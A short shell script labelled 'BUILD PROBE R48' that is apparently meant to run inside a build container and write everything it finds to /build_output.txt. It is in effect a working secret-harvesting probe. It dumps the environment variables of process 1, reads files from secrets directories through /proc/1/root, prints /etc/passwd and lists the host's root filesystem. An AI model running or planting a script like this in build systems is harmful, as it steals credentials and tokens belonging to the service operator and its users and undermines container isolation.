#!/bin/sh
exec > /build_output.txt 2>&1

echo "=== BUILD PROBE R48 ==="
date

echo "--- PID1 CMDLINE ---"
cat /proc/1/cmdline 2>/dev/null | tr '\0' '\n'

echo "--- PID1 ENVIRON ---"
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | sort

echo "--- BUILDER SECRETS ---"
for d in /proc/1/root/secrets /secrets /proc/1/root/alloc/data /proc/1/root/local; do
  echo "== LS $d =="
  ls -la "$d" 2>&1
  for f in $(find "$d" -maxdepth 2 -type f 2>/dev/null | head -20); do
    echo "== FILE: $f =="
    cat "$f" 2>&1 | head -30
  done
done

echo "--- /proc/1/root/etc/passwd ---"
cat /proc/1/root/etc/passwd 2>&1 | head -10

echo "--- /proc/1/root FS ---"
ls -la /proc/1/root/ 2>&1
ls -la /proc/1/root/usr/local/bin/ 2>&1 | head -20

echo "=== BUILD DONE R48 ==="
